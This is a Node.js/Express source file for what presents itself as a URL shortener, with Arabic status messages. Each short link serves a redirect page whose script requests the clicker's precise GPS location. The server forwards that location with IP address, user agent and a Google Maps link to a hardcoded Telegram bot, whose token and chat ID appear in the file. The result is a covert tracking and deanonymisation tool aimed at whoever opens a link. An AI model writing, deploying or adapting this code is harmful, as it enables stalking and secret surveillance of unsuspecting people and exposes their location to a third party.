const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
  try {
    console.log('[TG] Sending:', { shortCode, gps });
    
    let msg = `
🔗 رابط فُتح!
━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط الأصلي: ${originalUrl}
🔌 IP: ${ip}
`;

    if (gps && gps.lat && gps.lng) {
      const accuracy = gps.accuracy ? gps.accuracy.toFixed(0) : '?';
      msg += `
📍 دائرة العرض: ${gps.lat}
📍 خط الطول: ${gps.lng}
📏 الدقة: ±${accuracy} متر
🗺️ الخريطة: https://maps.google.com/?q=${gps.lat},${gps.lng}
📡 النوع: GPS
`;
    } else {
      msg += `
⚠️ الموقع: لم يتم الحصول على GPS
`;
    }

    msg += `
━━━━━━━━━━━
🖥️ Device: ${userAgent.substring(0, 50)}
⏰ ${new Date().toISOString()}
    `.trim();

    const result = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg },
      { timeout: 5000 }
    );
    
    console.log('[TG] Success:', result.data.ok);
  } catch (err) {
    console.error('[TG] Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  console.log('[API] Shorten request:', url);
  
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { 
    original: url, 
    created: new Date(), 
    clicks: 0
  };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  console.log('[API] Generated:', shortenedUrl);
  
  res.json({ shortened: shortenedUrl, code: shortCode });
});

// API لتسجيل الموقع
app.post('/api/log-visit', express.text(), (req, res) => {
  try {
    console.log('[LOG] Raw body:', req.body);
    
    let data = {};
    if (typeof req.body === 'string') {
      data = JSON.parse(req.body);
    } else {
      data = req.body;
    }
    
    const { code, gps } = data;
    console.log('[LOG] Parsed:', { code, gps });
    
    if (linkStorage[code]) {
      const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
      const userAgent = req.get('user-agent');
      const originalUrl = linkStorage[code].original;
      
      linkStorage[code].clicks++;
      
      console.log('[LOG] Sending to TG:', { code, ip, gps });
      sendToTelegram(ip, code, originalUrl, userAgent, gps);
    } else {
      console.log('[LOG] Code not found:', code);
    }
    
    res.json({ ok: true });
  } catch (err) {
    console.error('[LOG] Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// Redirect فوري
app.get('/:code', (req, res) => {
  const { code } = req.params;
  console.log('[REDIRECT] Code:', code);
  
  if (!linkStorage[code]) {
    console.log('[REDIRECT] Not found');
    return res.status(404).send('Not found');
  }

  const originalUrl = linkStorage[code].original;
  console.log('[REDIRECT] Original URL:', originalUrl);
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
</head>
<body>
  <script>
    console.log('Script loaded');
    const code = '${code}';
    const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
    const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit';
    
    console.log('Code:', code);
    console.log('API URL:', apiUrl);
    
    // Redirect فوري
    window.location.href = originalUrl;
    
    // جمع GPS
    setTimeout(() => {
      console.log('GPS timeout triggered');
      
      if (navigator.geolocation) {
        console.log('Geolocation available');
        
        navigator.geolocation.getCurrentPosition(
          (position) => {
            console.log('GPS success:', position.coords);
            
            const payload = {
              code: code,
              gps: {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy
              }
            };
            
            console.log('Sending:', JSON.stringify(payload));
            
            fetch(apiUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
              keepalive: true
            }).then(r => console.log('Fetch success')).catch(e => console.log('Fetch error:', e));
          },
          (error) => {
            console.log('GPS error:', error.message);
            
            const payload = { code: code, gps: null };
            fetch(apiUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
              keepalive: true
            }).then(r => console.log('Fetch success (no GPS)')).catch(e => console.log('Fetch error:', e));
          },
          { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
        );
      } else {
        console.log('Geolocation NOT available');
        
        const payload = { code: code, gps: null };
        fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        }).catch(e => console.log('Fetch error:', e));
      }
    }, 200);
  </script>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));